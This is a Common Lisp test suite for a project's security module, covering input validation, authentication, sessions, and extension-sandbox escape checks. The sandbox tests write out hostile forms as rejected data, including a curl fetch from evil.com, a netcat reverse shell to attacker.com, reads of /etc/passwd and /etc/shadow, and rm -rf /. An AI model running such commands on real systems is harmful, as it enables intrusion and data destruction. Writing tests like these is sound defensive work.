  ;; All integers
  (let ((result (autopoiesis.security:validate-input '(1 2 3) 
                                                     '(:list :element-type (:integer)))))
    (is-true (autopoiesis.security:validation-result-valid-p result)))
  
  ;; Mixed types when expecting integers
  (let ((result (autopoiesis.security:validate-input '(1 "two" 3) 
                                                     '(:list :element-type (:integer)))))
    (is-false (autopoiesis.security:validation-result-valid-p result))))

;;; One-Of Validation Tests

(test validate-one-of
  "Test one-of validation"
  ;; Valid option
  (let ((result (autopoiesis.security:validate-input "red" 
                                                     '(:one-of :options ("red" "green" "blue")))))
    (is-true (autopoiesis.security:validation-result-valid-p result)))
  
  ;; Invalid option
  (let ((result (autopoiesis.security:validate-input "yellow" 
                                                     '(:one-of :options ("red" "green" "blue")))))
    (is-false (autopoiesis.security:validation-result-valid-p result))))

;;; Combinator Validation Tests

(test validate-and-combinator
  "Test AND combinator validation"
  ;; Both pass
  (let ((result (autopoiesis.security:validate-input 50 
                                                     '(:and (:integer :min 0) (:integer :max 100)))))
    (is-true (autopoiesis.security:validation-result-valid-p result)))
  
  ;; One fails
  (let ((result (autopoiesis.security:validate-input 150 
                                                     '(:and (:integer :min 0) (:integer :max 100)))))
    (is-false (autopoiesis.security:validation-result-valid-p result))))

(test validate-or-combinator
  "Test OR combinator validation"
  ;; First passes
  (let ((result (autopoiesis.security:validate-input 42 
                                                     '(:or (:integer) (:string)))))
    (is-true (autopoiesis.security:validation-result-valid-p result)))
  
  ;; Second passes
  (let ((result (autopoiesis.security:validate-input "hello" 
                                                     '(:or (:integer) (:string)))))
    (is-true (autopoiesis.security:validation-result-valid-p result)))
  
  ;; Neither passes
  (let ((result (autopoiesis.security:validate-input :keyword 
                                                     '(:or (:integer) (:string)))))
    (is-false (autopoiesis.security:validation-result-valid-p result))))

(test validate-nullable
  "Test nullable validation"
  ;; NIL is valid
  (let ((result (autopoiesis.security:validate-input nil '(:nullable (:string)))))
    (is-true (autopoiesis.security:validation-result-valid-p result)))
  
  ;; Valid string
  (let ((result (autopoiesis.security:validate-input "hello" '(:nullable (:string)))))
    (is-true (autopoiesis.security:validation-result-valid-p result)))
  
  ;; Invalid type
  (let ((result (autopoiesis.security:validate-input 42 '(:nullable (:string)))))
    (is-false (autopoiesis.security:validation-result-valid-p result))))

;;; Plist Validation Tests

(test validate-plist-basic
  "Test basic plist validation"
  ;; Valid plist
  (let ((result (autopoiesis.security:validate-input '(:name "test" :value 42) '(:plist))))
    (is-true (autopoiesis.security:validation-result-valid-p result)))
  
  ;; Odd-length list is not a valid plist
  (let ((result (autopoiesis.security:validate-input '(:name "test" :value) '(:plist))))
    (is-false (autopoiesis.security:validation-result-valid-p result))))

(test validate-plist-required-keys
  "Test plist required keys"
  ;; Has required keys
  (let ((result (autopoiesis.security:validate-input '(:name "test" :id 1) 
                                                     '(:plist :required-keys (:name :id)))))
    (is-true (autopoiesis.security:validation-result-valid-p result)))
  
  ;; Missing required key
  (let ((result (autopoiesis.security:validate-input '(:name "test") 
                                                     '(:plist :required-keys (:name :id)))))
    (is-false (autopoiesis.security:validation-result-valid-p result))))

;;; Valid-p Predicate Tests

(test valid-p-predicate
  "Test valid-p predicate function"
  (is-true (autopoiesis.security:valid-p "hello" '(:string)))
  (is-false (autopoiesis.security:valid-p 123 '(:string)))
  (is-true (autopoiesis.security:valid-p 42 '(:integer :min 0 :max 100)))
  (is-false (autopoiesis.security:valid-p 150 '(:integer :max 100))))

;;; Validation Error Condition Tests

(test validation-error-condition
  "Test validation-error condition"
  (signals autopoiesis.security:validation-error
    (autopoiesis.security:with-validated-input (x 123 '(:string))
      x)))

;;; Sanitization Tests

(test sanitize-string-basic
  "Test basic string sanitization"
  ;; Trim whitespace
  (is (string= "hello" (autopoiesis.security:sanitize-string "  hello  ")))
  
  ;; Truncate
  (is (string= "hello" (autopoiesis.security:sanitize-string "hello world" :max-length 5)))
  
  ;; Don't trim if disabled
  (is (string= "  hello  " (autopoiesis.security:sanitize-string "  hello  " :trim nil))))

(test sanitize-string-control-chars
  "Test control character removal"
  ;; Remove control chars but keep newlines
  (let ((result (autopoiesis.security:sanitize-string 
                 (format nil "hello~Cworld~%test" (code-char 1)))))
    (is (search "helloworld" result))
    (is (search (string #\Newline) result))))

(test sanitize-html
  "Test HTML sanitization"
  (is (string= "&lt;script&gt;" 
               (autopoiesis.security:sanitize-html "<script>")))
  (is (string= "&amp;amp;" 
               (autopoiesis.security:sanitize-html "&amp;")))
  (is (string= "&quot;quoted&quot;" 
               (autopoiesis.security:sanitize-html "\"quoted\""))))

;;; Predefined Specs Tests

(test predefined-validation-specs
  "Test predefined validation specs exist and work"
  ;; Agent ID spec
  (is-true (autopoiesis.security:valid-p "agent-123" 
                                          autopoiesis.security:*validation-spec-agent-id*))
  (is-false (autopoiesis.security:valid-p "agent 123" 
                                           autopoiesis.security:*validation-spec-agent-id*))
  
  ;; Action spec
  (is-true (autopoiesis.security:valid-p :read 
                                          autopoiesis.security:*validation-spec-action*))
  (is-false (autopoiesis.security:valid-p :unknown 
                                           autopoiesis.security:*validation-spec-action*))
  
  ;; Resource type spec
  (is-true (autopoiesis.security:valid-p :snapshot 
                                          autopoiesis.security:*validation-spec-resource-type*))
  (is-false (autopoiesis.security:valid-p :invalid 
                                           autopoiesis.security:*validation-spec-resource-type*)))

;;; Batch Validation Tests

(test validate-inputs-batch
  "Test batch validation of multiple inputs"
  ;; All valid
  (let ((result (autopoiesis.security:validate-inputs
                 '(("name" "test" (:string :max-length 100))
                   ("count" 42 (:integer :min 0))
                   ("active" t (:boolean))))))
    (is-true (autopoiesis.security:validation-result-valid-p result)))
  
  ;; One invalid
  (let ((result (autopoiesis.security:validate-inputs
                 '(("name" "test" (:string :max-length 100))
                   ("count" -5 (:integer :min 0))
                   ("active" t (:boolean))))))
    (is-false (autopoiesis.security:validation-result-valid-p result))
    (is (= 1 (length (autopoiesis.security:validation-result-errors result))))))

;;; ═══════════════════════════════════════════════════════════════════
;;; Authentication Tests
;;; ═══════════════════════════════════════════════════════════════════

;;; Password Hashing Tests

(test password-hashing-basic
  "Test basic password hashing and verification"
  ;; Hash a password
  (let ((hash (autopoiesis.security:hash-password "test-password")))
    (is (stringp hash))
    (is (> (length hash) 0))

    ;; Verify correct password
    (is-true (autopoiesis.security:verify-password "test-password" hash))

    ;; Reject incorrect password
    (is-false (autopoiesis.security:verify-password "wrong-password" hash))))

(test password-hashing-different-inputs
  "Test that different passwords produce different hashes"
  (let ((hash1 (autopoiesis.security:hash-password "password1"))
        (hash2 (autopoiesis.security:hash-password "password2")))
    (is (string/= hash1 hash2))))

;;; User Management Tests

(test create-user-basic
  "Test basic user creation"
  (autopoiesis.substrate:with-store ()
    ;; Create a user
    (let ((user (autopoiesis.security:create-user "test-user" "password123"
                                                  :email "test@example.com"
                                                  :roles '(:user))))
      (is-true (autopoiesis.security:user-p user))
      (is (string= "test-user" (autopoiesis.security:user-username user)))
      (is (string= "test@example.com" (autopoiesis.security:user-email user)))
      (is (equal '(:user) (autopoiesis.security:user-roles user)))
      (is-true (autopoiesis.security:user-active-p user))
      (is (integerp (autopoiesis.security:user-created-at user))))

    ;; User should be findable
    (let ((found-user (autopoiesis.security:find-user-by-username "test-user")))
      (is-true found-user)
      (is (string= "test-user" (autopoiesis.security:user-username found-user))))))

(test create-user-validation
  "Test user creation validation"
  (autopoiesis.substrate:with-store ()
    ;; Invalid username
    (signals autopoiesis.security:validation-error
      (autopoiesis.security:create-user "user with spaces" "password"))

    ;; Invalid password (too short)
    (signals autopoiesis.security:validation-error
      (autopoiesis.security:create-user "valid-user" "short"))

    ;; Invalid email
    (signals autopoiesis.security:validation-error
      (autopoiesis.security:create-user "valid-user" "valid-password"
                                        :email "not-an-email"))

    ;; Duplicate username
    (autopoiesis.security:create-user "duplicate-user" "password")
    (signals autopoiesis.security:validation-error
      (autopoiesis.security:create-user "duplicate-user" "different-password"))))

(test user-entity-persistence
  "Test user entity persistence in substrate"
  (autopoiesis.substrate:with-store ()
    (let* ((user (autopoiesis.security:create-user "persist-user" "password"))
           (user-id (autopoiesis.security:user-id user)))

      ;; Check entity exists in substrate
      (is-true (autopoiesis.substrate:entity-attr user-id :user/username))
      (is (string= "persist-user"
                   (autopoiesis.substrate:entity-attr user-id :user/username)))

      ;; Reload user from entity
      (let ((reloaded (autopoiesis.security:make-user-from-entity user-id)))
        (is (string= "persist-user" (autopoiesis.security:user-username reloaded)))
        (is-true (autopoiesis.security:user-active-p reloaded))))))

;;; Session Management Tests

(test session-creation
  "Test session creation and properties"
  (autopoiesis.substrate:with-store ()
    (let* ((user (autopoiesis.security:create-user "session-user" "password"))
           (session (autopoiesis.security:create-session user
                                                         :ip-address "192.168.1.1"
                                                         :user-agent "Test Browser")))

      (is-true (autopoiesis.security:session-p session))
      (is (stringp (autopoiesis.security:session-token session)))
      (= (length (autopoiesis.security:session-token session)) 64)  ; 32 bytes * 2 hex chars
      (is (eq (autopoiesis.security:user-id user) (autopoiesis.security:session-user-id session)))
      (is-true (autopoiesis.security:session-active-p session))
      (is (string= "192.168.1.1" (autopoiesis.security:session-ip-address session)))
      (is (string= "Test Browser" (autopoiesis.security:session-user-agent session)))
      (is (integerp (autopoiesis.security:session-created-at session)))
      (is (integerp (autopoiesis.security:session-expires-at session)))
      (is (> (autopoiesis.security:session-expires-at session)
             (autopoiesis.security:session-created-at session))))))

(test session-token-validation
  "Test session token validation"
  (autopoiesis.substrate:with-store ()
    (let* ((user (autopoiesis.security:create-user "token-user" "password"))
           (session (autopoiesis.security:create-session user))
           (token (autopoiesis.security:session-token session)))

      ;; Valid token should return user and session
      (multiple-value-bind (found-user found-session)
          (autopoiesis.security:validate-session-token token)
        (is-true found-user)
        (is-true found-session)
        (is (eq (autopoiesis.security:user-id user) (autopoiesis.security:user-id found-user))))

      ;; Invalid token should return NIL
      (multiple-value-bind (found-user found-session)
          (autopoiesis.security:validate-session-token "invalid-token")
        (is-false found-user)
        (is-false found-session)))))

(test session-expiration
  "Test session expiration"
  (autopoiesis.substrate:with-store ()
    ;; Create a session with very short lifetime
    (let* ((user (autopoiesis.security:create-user "expire-user" "password"))
           (session (autopoiesis.security:create-session user :lifetime 1)))  ; 1 second

      ;; Wait for expiration
      (sleep 2)

      ;; Token should no longer be valid
      (multiple-value-bind (found-user found-session)
          (autopoiesis.security:validate-session-token
           (autopoiesis.security:session-token session))
        (is-false found-user)
        (is-false found-session)))))

(test session-invalidation
  "Test session invalidation"
  (autopoiesis.substrate:with-store ()
    (let* ((user (autopoiesis.security:create-user "invalidate-user" "password"))
           (session (autopoiesis.security:create-session user))
           (token (autopoiesis.security:session-token session)))

      ;; Session should be valid initially
      (multiple-value-bind (found-user found-session)
          (autopoiesis.security:validate-session-token token)
        (is-true found-user)
        (is-true found-session))

      ;; Invalidate session
      (autopoiesis.security:invalidate-session session)

      ;; Session should no longer be valid
      (multiple-value-bind (found-user found-session)
          (autopoiesis.security:validate-session-token token)
        (is-false found-user)
        (is-false found-session))

      ;; Session object should reflect invalidation
      (is-false (autopoiesis.security:session-active-p session)))))

;;; Authentication Function Tests

(test authenticate-user-success
  "Test successful user authentication"
  (autopoiesis.substrate:with-store ()
    (autopoiesis.security:create-user "auth-user" "correct-password")

    ;; Successful authentication
    (let ((session (autopoiesis.security:authenticate-user "auth-user" "correct-password"
                                                           :ip-address "127.0.0.1")))
      (is-true session)
      (is (string= "auth-user" (autopoiesis.security:user-username
                                (autopoiesis.security:find-user-by-id
                                 (autopoiesis.security:session-user-id session))))))))

(test authenticate-user-failures
  "Test authentication failure cases"
  (autopoiesis.substrate:with-store ()
    (autopoiesis.security:create-user "fail-user" "correct-password")

    ;; Wrong password
    (signals autopoiesis.security:invalid-credentials
      (autopoiesis.security:authenticate-user "fail-user" "wrong-password"))

    ;; Non-existent user
    (signals autopoiesis.security:invalid-credentials
      (autopoiesis.security:authenticate-user "nonexistent" "password"))

    ;; Inactive user
    (autopoiesis.security:create-user "inactive-user" "password" :active nil)
    (signals autopoiesis.security:account-inactive
      (autopoiesis.security:authenticate-user "inactive-user" "password"))))

(test user-logout
  "Test user logout functionality"
  (autopoiesis.substrate:with-store ()
    (let* ((user (autopoiesis.security:create-user "logout-user" "password"))
           (session (autopoiesis.security:authenticate-user "logout-user" "password"))
           (token (autopoiesis.security:session-token session)))

      ;; Session should be valid
      (multiple-value-bind (found-user found-session)
          (autopoiesis.security:validate-session-token token)
        (is-true found-user)
        (is-true found-session))

      ;; Logout
      (autopoiesis.security:logout-user session)

      ;; Session should be invalid
      (multiple-value-bind (found-user found-session)
          (autopoiesis.security:validate-session-token token)
        (is-false found-user)
        (is-false found-session)))))

(test change-user-password
  "Test password change functionality"
  (autopoiesis.substrate:with-store ()
    (autopoiesis.security:create-user "change-pass-user" "old-password")

    ;; Change password
    (autopoiesis.security:change-user-password "change-pass-user" "old-password" "new-password")

    ;; Old password should no longer work
    (signals autopoiesis.security:invalid-credentials
      (autopoiesis.security:authenticate-user "change-pass-user" "old-password"))

    ;; New password should work
    (let ((session (autopoiesis.security:authenticate-user "change-pass-user" "new-password")))
      (is-true session))))

;;; Permission Integration Tests

(test setup-user-permissions-basic
  "Test setting up permissions for users based on roles"
  (autopoiesis.substrate:with-store ()
    (let ((user (autopoiesis.security:create-user "perm-user" "password" :roles '(:user))))
      ;; Setup permissions
      (let ((permissions (autopoiesis.security:setup-user-permissions user)))
        (is (listp permissions))
        (is (plusp (length permissions)))

        ;; Should have default user permissions
        (is (>= (length (autopoiesis.security:get-user-permissions
                         (autopoiesis.security:user-username user)))
                (length autopoiesis.security:*default-agent-permissions*)))))))

(test setup-user-permissions-admin
  "Test admin user gets admin permissions"
  (autopoiesis.substrate:with-store ()
    (let ((admin-user (autopoiesis.security:create-user "admin-user" "password" :roles '(:admin))))
      (autopoiesis.security:setup-user-permissions admin-user)

      ;; Admin should have all permissions
      (is-true (autopoiesis.security:check-permission
                (autopoiesis.security:user-username admin-user)
                :snapshot :delete))
      (is-true (autopoiesis.security:check-permission
                (autopoiesis.security:user-username admin-user)
                :agent :admin)))))

;;; User Listing and Management Tests

(test list-users-basic
  "Test listing users"
  (autopoiesis.substrate:with-store ()
    (autopoiesis.security:create-user "list-user1" "password" :active t)
    (autopoiesis.security:create-user "list-user2" "password" :active nil)
    (autopoiesis.security:create-user "list-user3" "password" :active t)

    ;; List all active users
    (let ((active-users (autopoiesis.security:list-users :active-only t)))
      (is (= 2 (length active-users)))
      (is (every #'autopoiesis.security:user-active-p active-users)))

    ;; List all users
    (let ((all-users (autopoiesis.security:list-users :active-only nil)))
      (is (= 3 (length all-users))))))

;;; Authentication System Initialization Tests

(test authentication-system-init
  "Test authentication system initialization"
  ;; Should be able to call init without error
  (finishes (autopoiesis.security:init-authentication-system))
  (is-true autopoiesis.security:*authentication-initialized*))

;;; Session Cleanup Tests

(test session-cleanup
  "Test expired session cleanup"
  (autopoiesis.substrate:with-store ()
    ;; Create a session with very short lifetime
    (let ((user (autopoiesis.security:create-user "cleanup-user" "password"))
          (old-lifetime autopoiesis.security:*session-lifetime*))
      ;; Temporarily set very short lifetime
      (setf autopoiesis.security:*session-lifetime* 1)
      (autopoiesis.security:create-session user)

      ;; Wait for expiration
      (sleep 2)

      ;; Cleanup should remove expired sessions
      (let ((cleaned-count (autopoiesis.security:cleanup-expired-sessions)))
        (is (>= cleaned-count 1)))

      ;; Restore original lifetime
      (setf autopoiesis.security:*session-lifetime* old-lifetime))))

;;; ═══════════════════════════════════════════════════════════════════
;;; Sandbox Escape Attempt Tests (Phase 10.2)
;;; ═══════════════════════════════════════════════════════════════════
;;;
;;; These tests verify that the extension compiler sandbox properly blocks
;;; various attempts to escape the sandbox and execute dangerous operations.

;;; ─────────────────────────────────────────────────────────────────
;;; Direct Forbidden Symbol Tests
;;; ─────────────────────────────────────────────────────────────────

(test sandbox-escape-direct-eval
  "Test that direct eval calls are blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(eval '(delete-file "/etc/passwd")))
    (is-false valid)
    (is (some (lambda (e) (search "eval" e :test #'char-equal)) errors))))

(test sandbox-escape-direct-compile
  "Test that direct compile calls are blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(compile nil '(lambda () (run-program "rm" '("-rf" "/")))))
    (is-false valid)
    (is (some (lambda (e) (search "compile" e :test #'char-equal)) errors))))

(test sandbox-escape-direct-load
  "Test that direct load calls are blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(load "/tmp/malicious.lisp"))
    (is-false valid)
    (is (some (lambda (e) (search "load" e :test #'char-equal)) errors))))

;;; ─────────────────────────────────────────────────────────────────
;;; File System Escape Attempts
;;; ─────────────────────────────────────────────────────────────────

(test sandbox-escape-open-file
  "Test that opening files is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(open "/etc/passwd" :direction :input))
    (is-false valid)
    (is (some (lambda (e) (search "open" e :test #'char-equal)) errors))))

(test sandbox-escape-with-open-file
  "Test that with-open-file is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(with-open-file (stream "/etc/shadow")
          (read-line stream)))
    (is-false valid)
    (is (some (lambda (e) (search "with-open-file" e :test #'char-equal)) errors))))

(test sandbox-escape-delete-file
  "Test that delete-file is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(delete-file "/important/data.db"))
    (is-false valid)
    (is (some (lambda (e) (search "delete" e :test #'char-equal)) errors))))

(test sandbox-escape-rename-file
  "Test that rename-file is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(rename-file "/etc/passwd" "/etc/passwd.bak"))
    (is-false valid)
    (is (some (lambda (e) (search "rename" e :test #'char-equal)) errors))))

(test sandbox-escape-probe-file
  "Test that probe-file is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(probe-file "/etc/shadow"))
    (is-false valid)
    (is (some (lambda (e) (search "probe" e :test #'char-equal)) errors))))

(test sandbox-escape-directory
  "Test that directory listing is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(directory "/home/*"))
    (is-false valid)
    (is (some (lambda (e) (search "directory" e :test #'char-equal)) errors))))

(test sandbox-escape-ensure-directories-exist
  "Test that ensure-directories-exist is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(ensure-directories-exist "/tmp/malicious/path/"))
    (is-false valid)
    (is (some (lambda (e) (search "ensure-directories" e :test #'char-equal)) errors))))

;;; ─────────────────────────────────────────────────────────────────
;;; External Process Escape Attempts
;;; ─────────────────────────────────────────────────────────────────

(test sandbox-escape-run-program
  "Test that run-program is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(run-program "curl" '("http://evil.com/malware.sh")))
    (is-false valid)
    (is (some (lambda (e) (search "run-program" e :test #'char-equal)) errors))))

(test sandbox-escape-sb-ext-run-program
  "Test that sb-ext:run-program is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(sb-ext:run-program "/bin/sh" '("-c" "whoami")))
    (is-false valid)
    (is (some (lambda (e) (or (search "run-program" e :test #'char-equal)
                               (search "sb-ext" e :test #'char-equal)))
              errors))))

(test sandbox-escape-uiop-run-program
  "Test that uiop:run-program is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(uiop:run-program "cat /etc/passwd"))
    (is-false valid)
    (is (some (lambda (e) (or (search "run-program" e :test #'char-equal)
                               (search "uiop" e :test #'char-equal)))
              errors))))

(test sandbox-escape-uiop-launch-program
  "Test that uiop:launch-program is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(uiop:launch-program "nc -e /bin/sh attacker.com 4444"))
    (is-false valid)
    (is (some (lambda (e) (or (search "launch-program" e :test #'char-equal)
                               (search "uiop" e :test #'char-equal)))
              errors))))

;;; ─────────────────────────────────────────────────────────────────
;;; Global State Mutation Escape Attempts
;;; ─────────────────────────────────────────────────────────────────

(test sandbox-escape-setf
  "Test that setf is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(setf *allowed-packages* '("EVERYTHING")))
    (is-false valid)
    (is (some (lambda (e) (search "setf" e :test #'char-equal)) errors))))

(test sandbox-escape-setq
  "Test that setq is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(setq *forbidden-symbols* nil))
    (is-false valid)
    (is (some (lambda (e) (search "setq" e :test #'char-equal)) errors))))

(test sandbox-escape-defvar
  "Test that defvar is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(defvar *backdoor* (lambda () (run-program "sh" nil))))
    (is-false valid)
    (is (some (lambda (e) (search "defvar" e :test #'char-equal)) errors))))

(test sandbox-escape-defparameter
  "Test that defparameter is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(defparameter *evil-hook* #'identity))
    (is-false valid)
    (is (some (lambda (e) (search "defparameter" e :test #'char-equal)) errors))))

(test sandbox-escape-defconstant
  "Test that defconstant is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(defconstant +backdoor-port+ 4444))
    (is-false valid)
    (is (some (lambda (e) (search "defconstant" e :test #'char-equal)) errors))))

;;; ─────────────────────────────────────────────────────────────────
;;; Definition Form Escape Attempts
;;; ─────────────────────────────────────────────────────────────────

(test sandbox-escape-defun
  "Test that defun is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(defun backdoor () (run-program "sh" nil)))
    (is-false valid)
    (is (some (lambda (e) (search "defun" e :test #'char-equal)) errors))))

(test sandbox-escape-defmacro
  "Test that defmacro is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(defmacro evil-macro (&body body)
          `(progn (run-program "sh" nil) ,@body)))
    (is-false valid)
    (is (some (lambda (e) (search "defmacro" e :test #'char-equal)) errors))))

(test sandbox-escape-defclass
  "Test that defclass is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(defclass backdoor-class ()
          ((payload :initform (lambda () (run-program "sh" nil))))))
    (is-false valid)
    (is (some (lambda (e) (search "defclass" e :test #'char-equal)) errors))))

(test sandbox-escape-defmethod
  "Test that defmethod is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(defmethod print-object :after ((obj t) stream)
          (run-program "logger" (list (prin1-to-string obj)))))
    (is-false valid)
    (is (some (lambda (e) (search "defmethod" e :test #'char-equal)) errors))))

(test sandbox-escape-defgeneric
  "Test that defgeneric is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(defgeneric backdoor-hook (obj)))
    (is-false valid)
    (is (some (lambda (e) (search "defgeneric" e :test #'char-equal)) errors))))

(test sandbox-escape-defstruct
  "Test that defstruct is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(defstruct malicious-data payload))
    (is-false valid)
    (is (some (lambda (e) (search "defstruct" e :test #'char-equal)) errors))))

;;; ─────────────────────────────────────────────────────────────────
;;; Package Manipulation Escape Attempts
;;; ─────────────────────────────────────────────────────────────────

(test sandbox-escape-intern
  "Test that intern is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(intern "BACKDOOR" :cl-user))
    (is-false valid)
    (is (some (lambda (e) (search "intern" e :test #'char-equal)) errors))))

(test sandbox-escape-export
  "Test that export is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(export 'backdoor :autopoiesis))
    (is-false valid)
    (is (some (lambda (e) (search "export" e :test #'char-equal)) errors))))

(test sandbox-escape-import
  "Test that import is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(import 'sb-ext:run-program))
    (is-false valid)
    (is (some (lambda (e) (search "import" e :test #'char-equal)) errors))))

(test sandbox-escape-use-package
  "Test that use-package is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(use-package :sb-ext))
    (is-false valid)
    (is (some (lambda (e) (search "use-package" e :test #'char-equal)) errors))))

(test sandbox-escape-make-package
  "Test that make-package is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(make-package :evil-package))
    (is-false valid)
    (is (some (lambda (e) (search "make-package" e :test #'char-equal)) errors))))

(test sandbox-escape-delete-package
  "Test that delete-package is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(delete-package :autopoiesis.security))
    (is-false valid)
    (is (some (lambda (e) (search "delete-package" e :test #'char-equal)) errors))))

;;; ─────────────────────────────────────────────────────────────────
;;; Reader Manipulation Escape Attempts
;;; ─────────────────────────────────────────────────────────────────

(test sandbox-escape-set-macro-character
  "Test that set-macro-character is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(set-macro-character #\@ (lambda (s c) (declare (ignore s c)) (run-program "sh" nil))))
    (is-false valid)
    (is (some (lambda (e) (search "set-macro-character" e :test #'char-equal)) errors))))

(test sandbox-escape-set-dispatch-macro-character
  "Test that set-dispatch-macro-character is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(set-dispatch-macro-character #\# #\! (lambda (s c n) (declare (ignore s c n)) (run-program "sh" nil))))
    (is-false valid)
    (is (some (lambda (e) (search "set-dispatch-macro-character" e :test #'char-equal)) errors))))

;;; ─────────────────────────────────────────────────────────────────
;;; Function Introspection Escape Attempts
;;; ─────────────────────────────────────────────────────────────────

(test sandbox-escape-symbol-function
  "Test that symbol-function is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(symbol-function 'validate-extension-code))
    (is-false valid)
    (is (some (lambda (e) (search "symbol-function" e :test #'char-equal)) errors))))

(test sandbox-escape-fdefinition
  "Test that fdefinition is blocked"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(fdefinition 'check-permission))
    (is-false valid)
    (is (some (lambda (e) (search "fdefinition" e :test #'char-equal)) errors))))

;;; ─────────────────────────────────────────────────────────────────
;;; Nested/Obfuscated Escape Attempts
;;; ─────────────────────────────────────────────────────────────────

(test sandbox-escape-nested-in-let
  "Test that forbidden operations nested in let are caught"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(let ((x 1))
          (let ((y 2))
            (eval '(+ x y)))))
    (is-false valid)
    (is (some (lambda (e) (search "eval" e :test #'char-equal)) errors))))

(test sandbox-escape-nested-in-progn
  "Test that forbidden operations nested in progn are caught"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(progn
          (+ 1 2)
          (delete-file "/tmp/test")
          (* 3 4)))
    (is-false valid)
    (is (some (lambda (e) (search "delete" e :test #'char-equal)) errors))))

(test sandbox-escape-nested-in-lambda
  "Test that forbidden operations nested in lambda body are caught"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(lambda (x)
          (when (> x 10)
            (run-program "alert" (list (format nil "~a" x))))
          x))
    (is-false valid)
    (is (some (lambda (e) (search "run-program" e :test #'char-equal)) errors))))

(test sandbox-escape-nested-in-flet
  "Test that forbidden operations nested in flet are caught"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(flet ((helper (x)
                 (eval x)))
          (helper '(+ 1 2))))
    (is-false valid)
    (is (some (lambda (e) (search "eval" e :test #'char-equal)) errors))))

(test sandbox-escape-nested-in-labels
  "Test that forbidden operations nested in labels are caught"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(labels ((recursive (n)
                   (if (zerop n)
                       (load "/tmp/payload.lisp")
                       (recursive (1- n)))))
          (recursive 5)))
    (is-false valid)
    (is (some (lambda (e) (search "load" e :test #'char-equal)) errors))))

(test sandbox-escape-nested-in-loop
  "Test that forbidden operations nested in loop are caught"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(loop for i from 1 to 10
              do (when (= i 5)
                   (open "/etc/passwd"))
              collect i))
    (is-false valid)
    (is (some (lambda (e) (search "open" e :test #'char-equal)) errors))))

(test sandbox-escape-nested-in-cond
  "Test that forbidden operations nested in cond are caught"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(cond
          ((= 1 1) (+ 1 2))
          ((= 2 2) (eval '(+ 3 4)))
          (t 0)))
    (is-false valid)
    (is (some (lambda (e) (search "eval" e :test #'char-equal)) errors))))

(test sandbox-escape-nested-in-case
  "Test that forbidden operations nested in case are caught"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(case (random 3)
          (0 (+ 1 2))
          (1 (compile nil '(lambda () t)))
          (2 (* 3 4))))
    (is-false valid)
    (is (some (lambda (e) (search "compile" e :test #'char-equal)) errors))))

;;; ─────────────────────────────────────────────────────────────────
;;; Function Reference Escape Attempts
;;; ─────────────────────────────────────────────────────────────────

(test sandbox-escape-function-reference
  "Test that #'forbidden-function references are caught"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(funcall #'eval '(+ 1 2)))
    (is-false valid)
    (is (some (lambda (e) (or (search "eval" e :test #'char-equal)
                               (search "funcall" e :test #'char-equal)))
              errors))))

(test sandbox-escape-apply-forbidden
  "Test that apply with forbidden functions is caught"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(apply #'delete-file '("/tmp/test")))
    (is-false valid)
    (is (some (lambda (e) (search "delete" e :test #'char-equal)) errors))))

